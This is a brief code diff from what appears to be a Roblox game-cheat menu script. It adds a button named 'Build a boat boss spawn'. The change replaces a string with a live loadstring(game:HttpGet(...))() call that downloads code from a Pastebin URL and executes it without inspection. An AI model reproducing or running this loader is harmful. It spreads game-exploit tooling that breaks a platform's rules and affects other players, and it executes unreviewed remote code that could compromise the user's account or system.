@@ -17,7 +17,7 @@ MainTab:AddButton({
 MainTab:AddButton({
 	Name = "Build a boat boss spawn",
 	Callback = function()
-		Name = "loadstring(game:HttpGet('https://pastebin.com/raw/wZcf0PwT'))()",
+        loadstring(game:HttpGet('https://pastebin.com/raw/wZcf0PwT'))()
   	end    
 })
 
